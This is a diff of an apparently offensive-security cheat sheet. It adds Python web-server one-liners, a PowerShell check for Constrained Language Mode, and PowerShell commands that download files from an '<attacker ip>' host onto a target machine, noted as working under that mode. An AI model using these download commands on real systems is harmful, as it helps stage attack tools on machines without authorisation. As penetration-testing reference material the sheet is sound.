@@ -46,6 +46,12 @@ $ python3 Ropper.py -f <file(s)>
 | List functions            | ```> afl``` |
 | Disassemble function      | ```> pdf [@ <function name>]``` |
 
+# Python
+
+## Host webserver in current directory
+```python3 -m http.server```
+```python2 -m SimpleHTTPServer```
+
 # PDF files
 ## Tools
 https://blog.didierstevens.com/programs/pdf-tools/
@@ -78,8 +84,12 @@ $ fcrackzip -u -D -p '/w/rockyou.txt' -v file.zip
 
 ## Powershell
 
-### Downloading files onto target machine
-```powershell -c Invoke-WebRequest -uri 'http://<attacker IP>/<file>```
+### Is Poserwhell running in Constrained language mode?
+```$ExecutionContext.SessionState.LanguageMode```
+
+### Download file over HTTP (works in CLM)
+```PS C:\> Invoke-WebRequest -uri http://<attacker ip>/<file> -o <output filename> ```
+```PS C:\> iwr -uri http://<attacker ip>/<file> -o <output filename> ```
 
 # PostSploit
 
